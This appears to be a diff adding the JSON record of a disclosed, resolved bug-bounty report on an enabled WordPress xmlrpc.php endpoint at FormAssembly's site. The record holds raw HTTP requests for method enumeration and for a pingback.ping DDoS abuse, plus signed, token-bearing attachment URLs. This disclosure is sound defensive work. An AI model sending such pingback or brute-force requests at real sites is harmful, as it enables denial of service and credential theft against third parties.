@@ -1,0 +1,137 @@
+{
+  "id": 448524,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NDg1MjQ=",
+  "url": "https://hackerone.com/reports/448524",
+  "title": "xmlrpc.php file is enable it will used for (DOS) and bruteforce attack",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-11-21T17:29:19.861Z",
+  "submitted_at": "2018-11-21T17:29:19.861Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "meepmerp",
+    "url": "/meepmerp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/v6atwp54akay6sml9l0lbil5h1lt/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 224,
+    "url": "https://hackerone.com/formassembly",
+    "handle": "formassembly",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/1flehqhfnayxmui5c1w6k47lfc7o/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/1flehqhfnayxmui5c1w6k47lfc7o/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "FormAssembly",
+      "twitter_handle": "FormAssembly",
+      "website": "https://www.formassembly.com",
+      "about": "FormAssembly is a powerful data collection platform that can streamline outdated processes and power business initiatives at your organization."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-12-27T03:55:49.725Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-11-27T03:55:45.899Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Wordpress that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The website https://www.formassembly.com/ has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.\n\nIn order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below.\n\nPOST /wp/xmlrpc.php HTTP/1.1\nHost: www.formassembly.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\nContent-Length: 91\n\n<methodCall>\n<methodName>system.listMethods</methodName>\n<params></params>\n</methodCall>\n***==================================================***\nHTTP/1.1 200 OK\nDate: Wed, 21 Nov 2018 16:43:06 GMT\nContent-Type: text/xml; charset=UTF-8\nConnection: close\nServer: nginx\nVary: Accept-Encoding\nX-XSS-Protection: 1; mode=block\nContent-Length: 4272\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodResponse>\n  <params>\n    <param>\n      <value>\n      <array><data>\n  <value><string>system.multicall</string></value>\n  <value><string>system.listMethods</string></value>\n  <value><string>system.getCapabilities</string></value>\n  <value><string>demo.addTwoNumbers</string></value>\n  <value><string>demo.sayHello</string></value>\n  <value><string>pingback.extensions.getPingbacks</string></value>\n  <value><string>pingback.ping</string></value>\n  <value><string>mt.publishPost</string></value>\n  <value><string>mt.getTrackbackPings</string></value>\n  <value><string>mt.supportedTextFilters</string></value>\n  <value><string>mt.supportedMethods</string></value>\n  <value><string>mt.setPostCategories</string></value>\n  <value><string>mt.getPostCategories</string></value>\n  <value><string>mt.getRecentPostTitles</string></value>\n  <value><string>mt.getCategoryList</string></value>\n  <value><string>metaWeblog.getUsersBlogs</string></value>\n  <value><string>metaWeblog.deletePost</string></value>\n  <value><string>metaWeblog.newMediaObject</string></value>\n  <value><string>metaWeblog.getCategories</string></value>\n  <value><string>metaWeblog.getRecentPosts</string></value>\n  <value><string>metaWeblog.getPost</string></value>\n  <value><string>metaWeblog.editPost</string></value>\n  <value><string>metaWeblog.newPost</string></value>\n  <value><string>blogger.deletePost</string></value>\n  <value><string>blogger.editPost</string></value>\n  <value><string>blogger.newPost</string></value>\n  <value><string>blogger.getRecentPosts</string></value>\n  <value><string>blogger.getPost</string></value>\n  <value><string>blogger.getUserInfo</string></value>\n  <value><string>blogger.getUsersBlogs</string></value>\n  <value><string>wp.restoreRevision</string></value>\n  <value><string>wp.getRevisions</string></value>\n  <value><string>wp.getPostTypes</string></value>\n  <value><string>wp.getPostType</string></value>\n  <value><string>wp.getPostFormats</string></value>\n  <value><string>wp.getMediaLibrary</string></value>\n  <value><string>wp.getMediaItem</string></value>\n  <value><string>wp.getCommentStatusList</string></value>\n  <value><string>wp.newComment</string></value>\n  <value><string>wp.editComment</string></value>\n  <value><string>wp.deleteComment</string></value>\n  <value><string>wp.getComments</string></value>\n  <value><string>wp.getComment</string></value>\n  <value><string>wp.setOptions</string></value>\n  <value><string>wp.getOptions</string></value>\n  <value><string>wp.getPageTemplates</string></value>\n  <value><string>wp.getPageStatusList</string></value>\n  <value><string>wp.getPostStatusList</string></value>\n  <value><string>wp.getCommentCount</string></value>\n  <value><string>wp.deleteFile</string></value>\n  <value><string>wp.uploadFile</string></value>\n  <value><string>wp.suggestCategories</string></value>\n  <value><string>wp.deleteCategory</string></value>\n  <value><string>wp.newCategory</string></value>\n  <value><string>wp.getTags</string></value>\n  <value><string>wp.getCategories</string></value>\n  <value><string>wp.getAuthors</string></value>\n  <value><string>wp.getPageList</string></value>\n  <value><string>wp.editPage</string></value>\n  <value><string>wp.deletePage</string></value>\n  <value><string>wp.newPage</string></value>\n  <value><string>wp.getPages</string></value>\n  <value><string>wp.getPage</string></value>\n  <value><string>wp.editProfile</string></value>\n  <value><string>wp.getProfile</string></value>\n  <value><string>wp.getUsers</string></value>\n  <value><string>wp.getUser</string></value>\n  <value><string>wp.getTaxonomies</string></value>\n  <value><string>wp.getTaxonomy</string></value>\n  <value><string>wp.getTerms</string></value>\n  <value><string>wp.getTerm</string></value>\n  <value><string>wp.deleteTerm</string></value>\n  <value><string>wp.editTerm</string></value>\n  <value><string>wp.newTerm</string></value>\n  <value><string>wp.getPosts</string></value>\n  <value><string>wp.getPost</string></value>\n  <value><string>wp.deletePost</string></value>\n  <value><string>wp.editPost</string></value>\n  <value><string>wp.newPost</string></value>\n  <value><string>wp.getUsersBlogs</string></value>\n</data></array>\n      </value>\n    </param>\n  </params>\n</methodResponse>\n\n\n\nNotice that a successful response is received showing that the xmlrpc.php file is enabled.\nNow, considering the domain https://www.formassembly.com the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below.\n\nPOST /wp/xmlrpc.php HTTP/1.1\nHost: www.formassembly.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\nContent-Length: 91\n\n<methodCall>\n<methodName>pingback.ping</methodName>\n<params>\n<param>\n<value><string>http://<***YOUR SERVER*** ></string></value>\n</param>\n<param>\n<value><string>https://www.formassembly.com/</string></value>\n</param>\n</params>\n</methodCall>\n\n\n***remediation:***\n\nIf the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.\n\n***Thank you***\n\nnote: screenshots are given below\n\n## Impact\n\nThis method is also used for brute force attacks to stealing the admin credentials and other important credentials\n\nThis can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 379019,
+      "file_name": "Screenshot1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/379/019/f570a5301daf29715ec812b2648ec77e70dc30f0/Screenshot1.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot1.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPEODDBF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152308Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQC29PU%2FjrhrTrwuQy3LCYqDX7UOerD9wzLzz4mr1y37%2BAIgUYd%2FG9GVl%2BwK5Rp%2BxodG0dOErIQ8NZcO3D966hxiDMkquwUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEsyD6YaEw%2BDun6YYSqPBYhYjKBX2bPG%2FFuZPmK37I0cJbJBCYOAvXftpysm%2BzXReAWxV6%2FUEbHl1un6%2B%2Bc6%2Fz44dS5%2B57KTilNptTJDUPZZQ8FGJ2AKX5PViJicXrcDMZbAoiFLyH9prJVs%2FwzgnZHX4osrWBFuNA0L7gDeqn9SNQ5Gknukt4vVfR580vRiHCTjBQsFHkXX%2Bs%2BLdf1v1Or7GsRN5H3lgDCnP3HLxEFvmkyB4i3NV0OH9YHSS8t0h2%2BVYGlht0PblS7mXUNl7gZKCaR5Hofafl0RMPHPdoPXTZdqVXV9VEFZJz1G6gQvbBImtHecquEMH%2Fp%2BT%2FCGdxX2U1aEJJCnshObrFAnudfvFrqvpY98eh1ailkKprI1SGbzbGmv%2ByKV3ClxJc5B4vckjM9O%2BC9owspxmNIx76CH4efb1gKtZDPutfIcFJSPgei5AViOYxt5vyGemlkfr9wkSCWqlNo0YEybBy8xdgTFfPIkqyxTmYZYXvQ%2B7NdbJgk8peowaTR7vnDBY5DY4w1XodT3MfYN5vCe45m2Zon7kKtcghPlp87Kk1b1NLWsjfqxLxBEiXc9VFQCcB3CIvYCJZ%2FjLY2Ov%2BFQVnJyPnkIixAJlGcyRtEaoiBqPWo5HFkvJ4%2FWC8YtfDQ%2BVCXqdjFw7KNlaWM4e76l7V5uZRZZIXwMRpUJJAti6e%2FgXP7a9WsS9D4I08H1a1x8h8g7HbjzcJMw0r6gINTJV%2B5NXx73Qxk7RXhqRycxrb473rokw1xPILHgwI36zQn0Ts9sXbwkUwioDWq4ueAOEsCqF0dul8fV4iI6Gbc7do3O%2BAs9bQokeb5KRo74UveVYA8F9w9boCn41xC928jKCUJfiXx1BLMQDWgd4IdDKIaveAcwkI79zwY6sQEbJwA2tB95lkFkWC%2FHXhPskbReU5Ub2jfXdmrffI5v05h%2B4Y7yCH%2BnlPexgdDZsQfvtYmzM0FbTZMHwoeNtm6bCbBQgBrtftx56Ooky6Z%2BIofWcb1M%2FAT5NrmyX99k5BaCJO3yTBLTiQI1EKTjbJQI%2Bc518mAGsJ6A0AZWQWy5oWC5TcNd%2FN4ieUqv10JEIKH%2B3eL5VixEcr9L83YVpmnpiGzV0ulYxlc5rPo%2B1vPLn%2BU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ea4abd3abdbd0664f52a847269d0cdb6fb973625749ea752a5c7a61ab42eddd2",
+      "file_size": 128829,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 379020,
+      "file_name": "Screenshot2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/379/020/951b8db13c6687f44ecfc7dc175d91ed8c08a5ba/Screenshot2.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot2.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPEODDBF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T152308Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQC29PU%2FjrhrTrwuQy3LCYqDX7UOerD9wzLzz4mr1y37%2BAIgUYd%2FG9GVl%2BwK5Rp%2BxodG0dOErIQ8NZcO3D966hxiDMkquwUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEsyD6YaEw%2BDun6YYSqPBYhYjKBX2bPG%2FFuZPmK37I0cJbJBCYOAvXftpysm%2BzXReAWxV6%2FUEbHl1un6%2B%2Bc6%2Fz44dS5%2B57KTilNptTJDUPZZQ8FGJ2AKX5PViJicXrcDMZbAoiFLyH9prJVs%2FwzgnZHX4osrWBFuNA0L7gDeqn9SNQ5Gknukt4vVfR580vRiHCTjBQsFHkXX%2Bs%2BLdf1v1Or7GsRN5H3lgDCnP3HLxEFvmkyB4i3NV0OH9YHSS8t0h2%2BVYGlht0PblS7mXUNl7gZKCaR5Hofafl0RMPHPdoPXTZdqVXV9VEFZJz1G6gQvbBImtHecquEMH%2Fp%2BT%2FCGdxX2U1aEJJCnshObrFAnudfvFrqvpY98eh1ailkKprI1SGbzbGmv%2ByKV3ClxJc5B4vckjM9O%2BC9owspxmNIx76CH4efb1gKtZDPutfIcFJSPgei5AViOYxt5vyGemlkfr9wkSCWqlNo0YEybBy8xdgTFfPIkqyxTmYZYXvQ%2B7NdbJgk8peowaTR7vnDBY5DY4w1XodT3MfYN5vCe45m2Zon7kKtcghPlp87Kk1b1NLWsjfqxLxBEiXc9VFQCcB3CIvYCJZ%2FjLY2Ov%2BFQVnJyPnkIixAJlGcyRtEaoiBqPWo5HFkvJ4%2FWC8YtfDQ%2BVCXqdjFw7KNlaWM4e76l7V5uZRZZIXwMRpUJJAti6e%2FgXP7a9WsS9D4I08H1a1x8h8g7HbjzcJMw0r6gINTJV%2B5NXx73Qxk7RXhqRycxrb473rokw1xPILHgwI36zQn0Ts9sXbwkUwioDWq4ueAOEsCqF0dul8fV4iI6Gbc7do3O%2BAs9bQokeb5KRo74UveVYA8F9w9boCn41xC928jKCUJfiXx1BLMQDWgd4IdDKIaveAcwkI79zwY6sQEbJwA2tB95lkFkWC%2FHXhPskbReU5Ub2jfXdmrffI5v05h%2B4Y7yCH%2BnlPexgdDZsQfvtYmzM0FbTZMHwoeNtm6bCbBQgBrtftx56Ooky6Z%2BIofWcb1M%2FAT5NrmyX99k5BaCJO3yTBLTiQI1EKTjbJQI%2Bc518mAGsJ6A0AZWQWy5oWC5TcNd%2FN4ieUqv10JEIKH%2B3eL5VixEcr9L83YVpmnpiGzV0ulYxlc5rPo%2B1vPLn%2BU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0f89cec16eaa8ff24c5eadb4e1bce26f06515c96b25884b335a5c1493d9102d1",
+      "file_size": 111919,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-12-27T03:55:45.970Z",
+  "allow_singular_disclosure_after": -232457242.17133257,
+  "singular_disclosure_allowed": true,
+  "vote_count": 31,
+  "voters": [
+    "g4mb4",
+    "ali",
+    "tess",
+    "sameerphad72",
+    "dhakal_ananda",
+    "savitar0x01",
+    "2026",
+    "whitesector",
+    "r3y",
+    "khizer47",
+    "and 21 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
